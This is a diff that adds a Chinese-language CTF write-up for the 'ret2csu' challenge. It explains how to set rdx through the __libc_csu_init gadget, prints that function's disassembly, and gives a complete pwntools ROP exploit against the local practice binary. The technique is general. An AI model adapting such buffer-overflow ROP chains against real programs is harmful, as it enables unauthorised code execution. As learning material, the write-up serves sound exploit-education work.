@@ -255,6 +255,76 @@ sh.send(payload)
 
 sh.interactive()
 
+```
 
+## ret2csu 2021-04-04 00:35
+题目中主要的困难在于构造调用ret2win中的rdx，因为从代码里是搜索不到类似：pop rdx，ret的代码片的，但通过观察可以看到在ret2csu的__libc_csu_init中包含部分可以对rdx赋值的代码，如下：
+text:0000000000400640                 public __libc_csu_init
+.text:0000000000400640 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
+.text:0000000000400640 ; __unwind {
+.text:0000000000400640                 push    r15
+.text:0000000000400642                 push    r14
+.text:0000000000400644                 mov     r15, rdx
+.text:0000000000400647                 push    r13
+.text:0000000000400649                 push    r12
+.text:000000000040064B                 lea     r12, __frame_dummy_init_array_entry
+.text:0000000000400652                 push    rbp
+.text:0000000000400653                 lea     rbp, __do_global_dtors_aux_fini_array_entry
+.text:000000000040065A                 push    rbx
+.text:000000000040065B                 mov     r13d, edi
+.text:000000000040065E                 mov     r14, rsi
+.text:0000000000400661                 sub     rbp, r12
+.text:0000000000400664                 sub     rsp, 8
+.text:0000000000400668                 sar     rbp, 3
+.text:000000000040066C                 call    _init_proc
+.text:0000000000400671                 test    rbp, rbp
+.text:0000000000400674                 jz      short loc_400696
+.text:0000000000400676                 xor     ebx, ebx
+.text:0000000000400678                 nop     dword ptr [rax+rax+00000000h]
+.text:0000000000400680
+.text:0000000000400680 loc_400680:                             ; CODE XREF: __libc_csu_init+54↓j
+.text:0000000000400680                 mov     rdx, r15
+.text:0000000000400683                 mov     rsi, r14
+.text:0000000000400686                 mov     edi, r13d
+.text:0000000000400689                 call    qword ptr [r12+rbx*8]
+.text:000000000040068D                 add     rbx, 1
+.text:0000000000400691                 cmp     rbp, rbx
+.text:0000000000400694                 jnz     short loc_400680
+.text:0000000000400696
+.text:0000000000400696 loc_400696:                             ; CODE XREF: __libc_csu_init+34↑j
+.text:0000000000400696                 add     rsp, 8
+.text:000000000040069A                 pop     rbx
+.text:000000000040069B                 pop     rbp
+.text:000000000040069C                 pop     r12
+.text:000000000040069E                 pop     r13
+.text:00000000004006A0                 pop     r14
+.text:00000000004006A2                 pop     r15
+.text:00000000004006A4                 retn
+.text:00000000004006A4 ; } // starts at 400640
+.text:00000000004006A4 __libc_csu_init endp
 
+代码中0000000000400680位置有对rdx的赋值，如果在函数后面的执行过程中不会破坏掉这个寄存器，那么就可以把对rdx的赋值转换为对r15的赋值了，因此手动调试，并对此函数（__libc_csu_init）手动设置传入参数，然后观察执行后的rdx是否有被修改，经过测试可以满足预期，因此可以使用这种方式，来构造rdx，但同时注意在调用__libc_csu_init时，不能直接调用开始位置，因为这样会把r15寄存器修改掉，因此选择其后面的指令作为开始，这样就需要在压入两个寄存器来平衡栈数据（shellcode += p64(csu_address) + p64(0) + p64(0)）
+
+EXP:
+```python
+from pwn import *
+
+sh = process("./ret2csu")
+
+pop_rdi = 0x4006a3
+pop_rsi_r15 = 0x4006a1
+csu_address = 0x400647
+call_ret2win = 0x400510
+
+shellcode = b'A' * 0x28
+shellcode += p64(pop_rdi) + p64(0xdeadbeefdeadbeef)
+shellcode += p64(pop_rsi_r15) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
+shellcode += p64(csu_address) + p64(0) + p64(0)
+shellcode += p64(pop_rdi) + p64(0xdeadbeefdeadbeef)
+shellcode += p64(pop_rsi_r15) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
+shellcode += p64(0x40062a)
+
+raw_input()
+sh.send(shellcode)
+sh.interactive()
 ```
